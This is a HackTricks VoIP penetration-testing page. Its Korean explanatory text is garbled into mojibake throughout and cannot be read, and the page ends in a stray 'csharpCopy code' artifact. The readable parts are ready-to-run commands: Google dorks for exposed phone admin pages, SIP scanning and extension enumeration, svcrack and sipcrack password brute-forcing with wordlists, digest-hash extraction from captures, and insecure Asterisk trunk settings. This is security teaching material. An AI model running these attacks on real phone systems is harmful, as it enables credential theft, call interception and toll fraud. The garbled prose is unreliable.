# VoIP Pentesting

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## VoIP ê¸°ë³¸ ì •ë³´

VoIPê°€ ì‘ë™í•˜ëŠ” ë°©ì‹ì— ëŒ€í•´ ë°°ìš°ë ¤ë©´ ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## VoIP ì—´ê±°

### ì „í™”ë²ˆí˜¸

ë ˆë“œ íŒ€ì´ í•  ìˆ˜ ìˆëŠ” ì²« ë²ˆì§¸ ë‹¨ê³„ ì¤‘ í•˜ë‚˜ëŠ” OSINT ë„êµ¬, Google ê²€ìƒ‰ ë˜ëŠ” ì›¹ í˜ì´ì§€ ìŠ¤í¬ë˜í•‘ì„ ì‚¬ìš©í•˜ì—¬ íšŒì‚¬ì™€ ì—°ë½í•  ìˆ˜ ìˆëŠ” ì‚¬ìš© ê°€ëŠ¥í•œ ì „í™”ë²ˆí˜¸ë¥¼ ê²€ìƒ‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

ì „í™”ë²ˆí˜¸ë¥¼ ì–»ì€ í›„ ì˜¨ë¼ì¸ ì„œë¹„ìŠ¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ìš´ì˜ìë¥¼ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

ìš´ì˜ìê°€ VoIP ì„œë¹„ìŠ¤ë¥¼ ì œê³µí•˜ëŠ”ì§€ ì—¬ë¶€ë¥¼ ì•Œë©´ íšŒì‚¬ê°€ VoIPë¥¼ ì‚¬ìš©í•˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤... ê²Œë‹¤ê°€, íšŒì‚¬ê°€ VoIP ì„œë¹„ìŠ¤ë¥¼ ê³ ìš©í•˜ì§€ ì•Šì•˜ì§€ë§Œ PSTN ì¹´ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì „í†µì ì¸ ì „í™”ë§ì— ìì²´ VoIP PBXë¥¼ ì—°ê²°í•˜ëŠ” ê²½ìš°ë„ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìë™ ì‘ë‹µ ë˜ëŠ” ìŒì•…ê³¼ ê°™ì€ ê²ƒë“¤ì€ ì¼ë°˜ì ìœ¼ë¡œ VoIPê°€ ì‚¬ìš©ë˜ê³  ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT ì •ë³´

VoIP ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ì‹ë³„í•˜ëŠ” ë° ë„ì›€ì´ ë˜ëŠ” ë‹¤ë¥¸ OSINT ì—´ê±°ëŠ” Red Teamì—ê²Œ ìœ ìš©í•©ë‹ˆë‹¤.

### ë„¤íŠ¸ì›Œí¬ ì—´ê±°

* **`nmap`**ì€ UDP ì„œë¹„ìŠ¤ë¥¼ ìŠ¤ìº”í•  ìˆ˜ ìˆì§€ë§Œ, ìŠ¤ìº”ë˜ëŠ” UDP ì„œë¹„ìŠ¤ì˜ ìˆ˜ê°€ ë§ê¸° ë•Œë¬¸ì— ë§¤ìš° ëŠë¦¬ê³  ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ ì„œë¹„ìŠ¤ì— ëŒ€í•´ì„œëŠ” ì •í™•í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* SIPViciousì˜ **`svmap`** (`sudo apt install sipvicious`)ì€ ì§€ì •ëœ ë„¤íŠ¸ì›Œí¬ì—ì„œ SIP ì„œë¹„ìŠ¤ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `svmap`ì€ User-Agent `friendly-scanner`ë¥¼ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì— **ì°¨ë‹¨í•˜ê¸° ì‰½ìŠµë‹ˆë‹¤**, í•˜ì§€ë§Œ `/usr/share/sipvicious/sipvicious`ì˜ ì½”ë“œë¥¼ ìˆ˜ì •í•˜ì—¬ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`**ì€ [**sippts**](https://github.com/Pepelux/sippts)**ì—ì„œ ì œê³µí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:** Sipscanì€ UDP, TCP ë˜ëŠ” TLSë¥¼ í†µí•´ SIP ì„œë¹„ìŠ¤ë¥¼ ë§¤ìš° ë¹ ë¥´ê²Œ ìŠ¤ìº”í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤. ë©€í‹°ìŠ¤ë ˆë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€ê·œëª¨ ë„¤íŠ¸ì›Œí¬ ë²”ìœ„ë¥¼ ìŠ¤ìº”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í¬íŠ¸ ë²”ìœ„ë¥¼ ì‰½ê²Œ ì§€ì •í•  ìˆ˜ ìˆìœ¼ë©° TCP ë° UDPë¥¼ ëª¨ë‘ ìŠ¤ìº”í•˜ê³  ë‹¤ë¥¸ ë°©ë²•ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ê¸°ë³¸ì ìœ¼ë¡œ OPTIONSë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤). ë˜í•œ ë‹¤ë¥¸ User-Agentë¥¼ ì§€ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤ (ê·¸ ì™¸ì—ë„ ë” ë§ì€ ê¸°ëŠ¥ì´ ìˆìŠµë‹ˆë‹¤).
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**: ë©”íƒ€ìŠ¤í”Œë¡œì‡
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### ì¶”ê°€ ë„¤íŠ¸ì›Œí¬ ì—´ê±°

PBXëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë‹¤ë¥¸ ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ë¥¼ ë…¸ì¶œì‹œí‚¬ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

* **69/UDP (TFTP)**: íŒì›¨ì–´ ì—…ë°ì´íŠ¸
* **80 (HTTP) / 443 (HTTPS)**: ì›¹ì—ì„œ ì¥ì¹˜ ê´€ë¦¬
* **389 (LDAP)**: ì‚¬ìš©ì ì •ë³´ë¥¼ ì €ì¥í•˜ëŠ” ëŒ€ì²´ ìˆ˜ë‹¨
* **3306 (MySQL**): MySQL ë°ì´í„°ë² ì´ìŠ¤
* **5038 (Manager)**: ë‹¤ë¥¸ í”Œë«í¼ì—ì„œ Asterisk ì‚¬ìš© ê°€ëŠ¥
* **5222 (XMPP)**: Jabberë¥¼ ì‚¬ìš©í•œ ë©”ì‹œì§€
* **5432 (PostgreSQL)**: PostgreSQL ë°ì´í„°ë² ì´ìŠ¤
* ê·¸ ì™¸...

### ë©”ì„œë“œ ì—´ê±°

`sippts`ì—ì„œ `sipenumerate.py`ë¥¼ ì‚¬ìš©í•˜ì—¬ PBXì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ **ë©”ì„œë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### Extension Enumeration

PBX(ì‚¬ì„¤ ë¶„ê¸° êµí™˜) ì‹œìŠ¤í…œì—ì„œì˜ í™•ì¥ì€ ì¡°ì§ì´ë‚˜ ê¸°ì—… ë‚´ì—ì„œ ê°œë³„ ì „í™” ë¼ì¸, ì¥ì¹˜ ë˜ëŠ” ì‚¬ìš©ìì—ê²Œ í• ë‹¹ëœ ê³ ìœ í•œ ë‚´ë¶€ ì‹ë³„ìë¥¼ ì˜ë¯¸í•©ë‹ˆë‹¤. í™•ì¥ì„ í†µí•´ ê° ì‚¬ìš©ìë‚˜ ì¥ì¹˜ì— ëŒ€í•´ ê°œë³„ ì™¸ë¶€ ì „í™” ë²ˆí˜¸ ì—†ì´ë„ ì¡°ì§ ë‚´ì—ì„œ íš¨ìœ¨ì ìœ¼ë¡œ ì „í™”ë¥¼ ë¼ìš°íŒ…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* SIPViciousì˜ **`svwar`** (`sudo apt install sipvicious`)ë¡œë¶€í„°: `svwar`ëŠ” ë¬´ë£Œ SIP PBX í™•ì¥ ë¼ì¸ ìŠ¤ìºë„ˆì…ë‹ˆë‹¤. ê°œë…ì ìœ¼ë¡œëŠ” ì „í†µì ì¸ ì›Œë‹¤ì´ì–¼ëŸ¬ì™€ ìœ ì‚¬í•˜ê²Œ **í™•ì¥ ë²”ìœ„ë‚˜ ì£¼ì–´ì§„ í™•ì¥ ëª©ë¡ì„ ì¶”ì¸¡í•¨ìœ¼ë¡œì¨ ì‘ë™**í•©ë‹ˆë‹¤.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`**ì€ [**sippts**](https://github.com/Pepelux/sippts)**ì—ì„œ ì œê³µí•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤:** SipextendëŠ” SIP ì„œë²„ì—ì„œ í™•ì¥ ê¸°ëŠ¥ì„ ì‹ë³„í•©ë‹ˆë‹¤. SipextendëŠ” ëŒ€ê·œëª¨ ë„¤íŠ¸ì›Œí¬ ë° í¬íŠ¸ ë²”ìœ„ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: metasploitì„ ì‚¬ìš©í•˜ì—¬ í™•ì¥ì/ì‚¬ìš©ì ì´ë¦„ì„ ì—´ê±°í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX**ëŠ” Inter Asterisk Exchange í”„ë¡œí† ì½œ **ì‚¬ìš©ìëª… ë¬´ì°¨ë³„ ëŒ€ì… ì—´ê±°ê¸°**ì…ë‹ˆë‹¤. enumIAXëŠ” ë‘ ê°€ì§€ ë‹¤ë¥¸ ëª¨ë“œì—ì„œ ì‘ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìˆœì°¨ì ì¸ ì‚¬ìš©ìëª… ì¶”ì¸¡ ë˜ëŠ” ì‚¬ì „ ê³µê²©.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP ê³µê²©

### ë¹„ë°€ë²ˆí˜¸ ë¬´ì°¨ë³„ ëŒ€ì…

**PBX**ì™€ ì¼ë¶€ **í™•ì¥ì/ì‚¬ìš©ì ì´ë¦„**ì„ ë°œê²¬í•œ í›„, ë ˆë“œ íŒ€ì€ ì¼ë°˜ì ì¸ ë¹„ë°€ë²ˆí˜¸ ì‚¬ì „ì„ ì‚¬ìš©í•˜ì—¬ ì¸ì¦ì„ ë¬´ì°¨ë³„ ëŒ€ì…í•˜ê¸° ìœ„í•´ í™•ì¥ìë¥¼ í†µí•´ `REGISTER` ë©”ì„œë“œë¡œ ì¸ì¦ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="danger" %}
**ì‚¬ìš©ì ì´ë¦„**ì´ í™•ì¥ìì™€ ë™ì¼í•  ìˆ˜ ìˆì§€ë§Œ, ì´ëŠ” PBX ì‹œìŠ¤í…œ, êµ¬ì„± ë° ì¡°ì§ì˜ ê¸°í˜¸ì— ë”°ë¼ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤...

ì‚¬ìš©ì ì´ë¦„ì´ í™•ì¥ìì™€ ë™ì¼í•˜ì§€ ì•Šì€ ê²½ìš°, ë¬´ì°¨ë³„ ëŒ€ì…ì„ ìœ„í•´ **ì‚¬ìš©ì ì´ë¦„ì„ ì•Œì•„ë‚´ì•¼ í•©ë‹ˆë‹¤**.
{% endhint %}

* SIPViciousì˜ **`svcrack`** (`sudo apt install sipvicious`): SVCrackì€ PBXì—ì„œ íŠ¹ì • ì‚¬ìš©ì ì´ë¦„/í™•ì¥ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë¬´ì°¨ë³„ ëŒ€ì…í•˜ì—¬ í¬ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`**ì€ [**sippts**](https://github.com/Pepelux/sippts)**ì—ì„œ ì œê³µí•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤:** SIP Digest Crackì€ SIP í”„ë¡œí† ì½œ ë‚´ì—ì„œ Digest ì¸ì¦ì„ í¬ë™í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP ìŠ¤ë‹ˆí•‘

**Open Wifi ë„¤íŠ¸ì›Œí¬** ë‚´ì—ì„œ VoIP ì¥ë¹„ë¥¼ ì°¾ìœ¼ë©´ ëª¨ë“  ì •ë³´ë¥¼ **ìŠ¤ë‹ˆí•‘**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”ìš±ì´, Ethernetìœ¼ë¡œ ì—°ê²°ë˜ê±°ë‚˜ ë³´í˜¸ëœ Wifiì— ì—°ê²°ëœ **ë³´ë‹¤ íì‡„ì ì¸ ë„¤íŠ¸ì›Œí¬** ë‚´ì— ìˆë‹¤ë©´ **ARPìŠ¤í‘¸í•‘**ê³¼ ê°™ì€ **MitM ê³µê²©**ì„ ìˆ˜í–‰í•˜ì—¬ **PBXì™€ ê²Œì´íŠ¸ì›¨ì´** ì‚¬ì´ì—ì„œ ì •ë³´ë¥¼ ìŠ¤ë‹ˆí•‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë„¤íŠ¸ì›Œí¬ ì •ë³´ ì¤‘ì—ì„œëŠ” ì¥ë¹„ë¥¼ ê´€ë¦¬í•˜ê¸° ìœ„í•œ **ì›¹ ìê²© ì¦ëª…**, ì‚¬ìš©ì **í™•ì¥**, **ì‚¬ìš©ì ì´ë¦„**, **IP** ì£¼ì†Œ, ì‹¬ì§€ì–´ **í•´ì‹œëœ ë¹„ë°€ë²ˆí˜¸**ì™€ **RTP íŒ¨í‚·**ì„ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ ì¬ìƒí•˜ì—¬ **ëŒ€í™”ë¥¼ ë“¤ì„ ìˆ˜**ë„ ìˆìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ ì •ë³´ë¥¼ ì–»ê¸° ìœ„í•´ Wireshark, tcpdumpì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆì§€ë§Œ, VoIP ëŒ€í™”ë¥¼ ìŠ¤ë‹ˆí•‘í•˜ê¸° ìœ„í•´ **íŠ¹ë³„íˆ ë§Œë“¤ì–´ì§„ ë„êµ¬ì¸** [**ucsniff**](https://github.com/Seabreg/ucsniff)ë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

{% hint style="danger" %}
**SIP í†µì‹ ì—ì„œ TLSë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°** SIP í†µì‹ ì„ ì•Œì•„ë³¼ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.\
**SRTP**ì™€ **ZRTP**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°ì—ë„ **RTP íŒ¨í‚·ì€ í‰ë¬¸ìœ¼ë¡œ í‘œì‹œë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
{% endhint %}

#### SIP ìê²© ì¦ëª…

**SIP REGISTER í†µì‹ **ì˜ ì˜ˆì œë¥¼ í™•ì¸í•˜ì—¬ **ìê²© ì¦ëª…ì´ ì–´ë–»ê²Œ ì „ì†¡ë˜ëŠ”ì§€** ì´í•´í•˜ì„¸ìš”.

* **`sipdump`** ë° **`sipcrack`**, **sipcrack**ì˜ ì¼ë¶€ (`apt-get install sipcrack`): ì´ ë„êµ¬ë“¤ì€ SIP í”„ë¡œí† ì½œ ë‚´ì—ì„œ **ë‹¤ì´ì œìŠ¤íŠ¸ ì¸ì¦**ì„ **pcapì—ì„œ ì¶”ì¶œ**í•˜ê³  **ë¸Œë£¨íŠ¸í¬ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** from [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark**ëŠ” PCAP íŒŒì¼ì—ì„œ SIP í”„ë¡œí† ì½œì˜ ë°ì´í„°ë¥¼ ì¶”ì¶œí•©ë‹ˆë‹¤.
* **SipDump**ëŠ” PCAP íŒŒì¼ì—ì„œ SIP Digest ì¸ì¦ì„ ì¶”ì¶œí•©ë‹ˆë‹¤.
* **SIP Digest Crack**ì€ SIP í”„ë¡œí† ì½œ ë‚´ì—ì„œ Digest ì¸ì¦ì„ í¬ë™í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### DTMF ì½”ë“œ

ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ì—ì„œëŠ” SIP ìê²© ì¦ëª…ë¿ë§Œ ì•„ë‹ˆë¼ **DTMF ì½”ë“œ**ë„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì½”ë“œëŠ” ì˜ˆë¥¼ ë“¤ì–´ **ìŒì„± ì‚¬ì„œí•¨**ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.\
ì´ëŸ¬í•œ ì½”ë“œë¥¼ **INFO SIP ë©”ì‹œì§€**, **ì˜¤ë””ì˜¤** ë˜ëŠ” **RTP íŒ¨í‚·** ë‚´ì— ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. RTP íŒ¨í‚· ë‚´ì— ì½”ë“œê°€ í¬í•¨ë˜ì–´ ìˆëŠ” ê²½ìš° ëŒ€í™”ì˜ í•´ë‹¹ ë¶€ë¶„ì„ ì˜ë¼ë‚´ê³  ë„êµ¬ multimoë¥¼ ì‚¬ìš©í•˜ì—¬ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
multimon -a DTMF -t wac pin.wav
```
### ë¬´ë£Œ í†µí™” / Asterisks ì—°ê²° êµ¬ì„± ì˜¤ë¥˜

Asteriskì—ì„œëŠ” íŠ¹ì • IP ì£¼ì†Œë¡œë¶€í„°ì˜ ì—°ê²° ë˜ëŠ” **ëª¨ë“  IP ì£¼ì†Œë¡œë¶€í„°ì˜ ì—°ê²°**ì„ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
host=10.10.10.10
host=dynamic
```
ë§Œì•½ IP ì£¼ì†Œê°€ ì§€ì •ëœë‹¤ë©´, í˜¸ìŠ¤íŠ¸ëŠ” ì¼ì • ì‹œê°„ë§ˆë‹¤ REGISTER ìš”ì²­ì„ ë³´ë‚´ì§€ ì•Šì•„ë„ ë©ë‹ˆë‹¤ (REGISTER íŒ¨í‚·ì—ëŠ” ì¼ë°˜ì ìœ¼ë¡œ 30ë¶„ ë™ì•ˆ ìœ íš¨í•œ TTLì´ í¬í•¨ë˜ì–´ ìˆìœ¼ë¯€ë¡œ ë‹¤ë¥¸ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì „í™”ê¸°ê°€ 30ë¶„ë§ˆë‹¤ REGISTERí•´ì•¼ í•©ë‹ˆë‹¤). ê·¸ëŸ¬ë‚˜ VoIP ì„œë²„ì—ì„œ ì „í™”ë¥¼ ë°›ì„ ìˆ˜ ìˆë„ë¡ ì—°ê²°ì„ í—ˆìš©í•˜ëŠ” ì—´ë¦° í¬íŠ¸ê°€ í•„ìš”í•©ë‹ˆë‹¤.

ì‚¬ìš©ìë¥¼ ì •ì˜í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì´ ì •ì˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **`type=user`**: ì‚¬ìš©ìëŠ” ì‚¬ìš©ìë¡œì„œ ì „í™”ë¥¼ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`type=friend`**: í”¼ì–´ë¡œ ì „í™”ë¥¼ ê±¸ê³  ì‚¬ìš©ìë¡œì„œ ì „í™”ë¥¼ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (í™•ì¥ê³¼ í•¨ê»˜ ì‚¬ìš©ë¨)
* **`type=peer`**: í”¼ì–´ë¡œ ì „í™”ë¥¼ ë³´ë‚´ê³  ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (SIP íŠ¸ë í¬)

ë˜í•œ ë‹¤ìŒê³¼ ê°™ì´ ë³´ì•ˆ ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹ ë¢°ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **`insecure=port`**: IPì— ì˜í•´ í™•ì¸ëœ í”¼ì–´ ì—°ê²°ì„ í—ˆìš©í•©ë‹ˆë‹¤.
* **`insecure=invite`**: INVITE ë©”ì‹œì§€ì— ëŒ€í•œ ì¸ì¦ì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **`insecure=port,invite`**: ë‘˜ ë‹¤

{% hint style="warning" %}
**`type=friend`**ë¥¼ ì‚¬ìš©í•  ë•ŒëŠ” **host** ë³€ìˆ˜ì˜ **ê°’ì´ ì‚¬ìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ ê´€ë¦¬ìê°€ ê·¸ ê°’ì„ ì‚¬ìš©í•˜ì—¬ SIP íŠ¸ë í¬ë¥¼ ì˜ëª» êµ¬ì„±í•˜ë©´ **ëˆ„êµ¬ë‚˜ ì—°ê²°í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤**.

ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì„±ì€ ì·¨ì•½í•©ë‹ˆë‹¤:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### ë¬´ë£Œ í†µí™” / Asterisks ì»¨í…ìŠ¤íŠ¸ ì˜ëª» êµ¬ì„±

Asteriskì—ì„œ **ì»¨í…ìŠ¤íŠ¸**ëŠ” ë‹¤ì´ì–¼ í”Œëœì—ì„œ **ê´€ë ¨ëœ í™•ì¥, ë™ì‘ ë° ê·œì¹™ì„ ê·¸ë£¹í™”í•˜ëŠ”** ì´ë¦„ì´ ì§€ì •ëœ ì»¨í…Œì´ë„ˆ ë˜ëŠ” ì„¹ì…˜ì…ë‹ˆë‹¤. ë‹¤ì´ì–¼ í”Œëœì€ Asterisk ì‹œìŠ¤í…œì˜ í•µì‹¬ êµ¬ì„± ìš”ì†Œë¡œì„œ, **ë“¤ì–´ì˜¤ëŠ” ë° ë‚˜ê°€ëŠ” ì „í™”ê°€ ì²˜ë¦¬ë˜ê³  ê²½ë¡œ ì§€ì •ë˜ëŠ” ë°©ì‹ì„ ì •ì˜**í•©ë‹ˆë‹¤. ì»¨í…ìŠ¤íŠ¸ëŠ” ë‹¤ì´ì–¼ í”Œëœì„ êµ¬ì„±í•˜ê³ , ì•¡ì„¸ìŠ¤ ì œì–´ë¥¼ ê´€ë¦¬í•˜ë©°, ì‹œìŠ¤í…œì˜ ì„œë¡œ ë‹¤ë¥¸ ë¶€ë¶„ ê°„ì— ë¶„ë¦¬ë¥¼ ì œê³µí•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤.

ê° ì»¨í…ìŠ¤íŠ¸ëŠ” ì¼ë°˜ì ìœ¼ë¡œ **`extensions.conf`** íŒŒì¼ì— ì •ì˜ë©ë‹ˆë‹¤. ì»¨í…ìŠ¤íŠ¸ëŠ” ëŒ€ê´„í˜¸ë¡œ í‘œì‹œë˜ë©°, ì»¨í…ìŠ¤íŠ¸ ì´ë¦„ì´ ê·¸ ì•ˆì— í¬í•¨ë©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```bash
csharpCopy code[my_context]
```
